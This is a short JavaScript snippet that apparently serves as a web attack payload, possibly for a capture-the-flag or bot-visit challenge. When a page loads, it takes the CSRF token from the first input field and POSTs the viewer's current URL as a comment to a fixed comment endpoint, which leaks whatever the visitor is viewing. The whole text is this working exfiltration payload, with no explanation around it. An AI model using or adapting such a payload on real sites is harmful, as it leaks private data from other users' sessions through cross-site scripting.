window.onload = function() {

  var csrf = document.getElementsByTagName("input")[0].value;
  var formData = new FormData();
  var data = window.location.href;
  formData.append("csrfmiddlewaretoken", csrf);
	//formData.append("creator", "fromBot");
  formData.append("body", data);

  fetch("/comment/5f23b748-ef89-456f-a0b9-acb169b5ee61",{
		  method: 'POST',
      credentials: 'omit',
		  body: formData
  });
};
